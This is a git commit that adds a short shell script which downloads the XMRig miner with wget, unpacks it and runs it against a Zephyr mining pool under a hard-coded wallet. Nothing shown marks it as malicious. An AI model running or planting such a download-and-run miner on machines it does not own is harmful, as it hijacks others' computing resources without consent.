eb91a09e579d9082fb0c55e10d82c9a3e576a306
adriancroket <165500159+adriancroket@users.noreply.github.com>
2024-05-18 16:19:47 +0000

    Create h.sh

---
+++ h.sh
@@ -0,0 +1,7 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+
+tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz
+
+cd xmrig-6.21.3
+
+./xmrig -o pool.zephyrprotocol.com:3333 -u ZEPHYR2XFrQBE2t2j6s1PvieMSbiJwRn4YmXjDhFpyhRjHWopLtjyVhDzA49PSBZeHcrKBZPTJ6Br37F6VeBFqe5bUKdnWCTdTN44-p x -k -a rx/0
